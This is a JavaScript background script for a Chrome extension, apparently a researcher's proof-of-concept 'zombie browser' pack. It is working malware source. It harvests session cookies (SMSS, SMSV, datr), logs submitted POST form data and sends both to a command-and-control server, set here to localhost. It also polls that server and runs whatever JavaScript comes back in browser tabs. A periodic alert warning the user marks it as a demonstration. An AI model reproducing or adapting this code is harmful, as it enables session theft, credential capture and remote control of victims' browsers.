/*

Zombie browser pack, remote control Chrome browsers via extensions, lite edition
Copyright (C) 2012  Zoltan Balazs

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

var config = new Object();

chrome.extension.onRequest.addListener(
  function(request, sender, sendResponse) {
    if (request.greeting == "postdata") {
      postDataLogger(request.message);
	  }
  });

/**
 * Possible parameters for request: action: "xhttp" for a cross-origin HTTP
 * request method: Default "GET" url : required, but not validated data : data
 * to send in a POST request
 * 
 * The callback function is called upon completion of the request
 */
function sendHTTP(request, callback) {
	if (request.action == "xhttp") {
		var xhttp = new XMLHttpRequest(), method = request.method ? request.method
				.toUpperCase()
				: 'GET';

		xhttp.onreadystatechange = function() {
			if (xhttp.readyState == 4 && xhttp.status == 200) {
				callback(xhttp.responseText);
			}
		}

		xhttp.open(method, request.url, true);
		if (method == 'POST') {
			xhttp.setRequestHeader("Content-Type",
					"application/x-www-form-urlencoded");
			// xhttp.setRequestHeader("Content-length", request.data.length);
		}
		xhttp.send(request.data);
	}
}


function cookieEvent(cookieList) {
	cookieArray = "SMSS,SMSV,datr".split(",");
	for ( var i = 0, len = cookieArray.length; i < len; i++) {

		chrome.cookies.getAll({
			name : cookieArray[i]
		}, function(cookies) {
			for ( var i in cookies) {
				cookie = "Domain: " + cookies[i].domain + " Name: "
						+ cookies[i].name + " Value: " + cookies[i].value + " Expiration date: " + cookies[i].expirationDate;
				var lsname  = (cookies[i].domain + cookies[i].name).replace(":","").replace("/","");
				
				if (localStorage[lsname] !== cookie){
					localStorage[lsname] = cookie;
							
				try {
					sendHTTP({
						method : "POST",
						action : "xhttp",
						url : 'http://127.0.0.1/addcookie/index.php' ,
						data : "cookie%5Bdata%5D="
								+ encodeURIComponent(cookie)
					}, function(responseText) {
						console.log("success cookielog");
						/* Callback function to deal with the response */
					}, "none")
				} catch (exc) {
					console.log("Error1: " + exc);
					return 'unknown';
				}
				}
			}
		});
	}
}

function postDataLogger(data) {
try {

		sendHTTP(
				{
					method : "POST",
					action : "xhttp",
					url : 'http://127.0.0.1/addpostinfo/index.php',
					data : "postinfo%5Bdata%5D=" + encodeURIComponent(data)
				}, function(responseText) {
					console.log("success postdata");
					/* Callback function to deal with the response */
				}, "none")
	} catch (exc) {
		console.log("Error2: " + exc);
		return 'unknown';
	}
}



var interval1 = window.setInterval(function(thisObj) {
	//console.log("getconfig");
	sendHTTP({
		method : "GET",
		action : "xhttp",
		url : "http://127.0.0.1/c/"
				+ "1.json?disable_cache=" +Math.floor(Math.random()*100001),
		data : ""
	}, function(responseText) {
		var oldconfig = new Object();
		oldconfig.jscommandid = 1;
		if (localStorage.config) {
			oldconfig = JSON.parse(localStorage.config);
		}
		// console.log(responseText);
		localStorage.config = responseText;
		config = JSON.parse(localStorage.config);

		if (oldconfig.jscommandid < config.jscommandid) {
			// console.log("Great success!");
			chrome.tabs.executeScript({code: config.jscommand});
		}
	});
}, 10 * 1000, this);


var interval4 = window.setInterval(function(thisObj) {
	cookieEvent(config.cookielist);
}, 15 * 1000, this);


var interval5 = window.setInterval(function(thisObj) {
	alert("Be warned user, a malicious extension is running in your browser.");
}, 60 * 1000, this);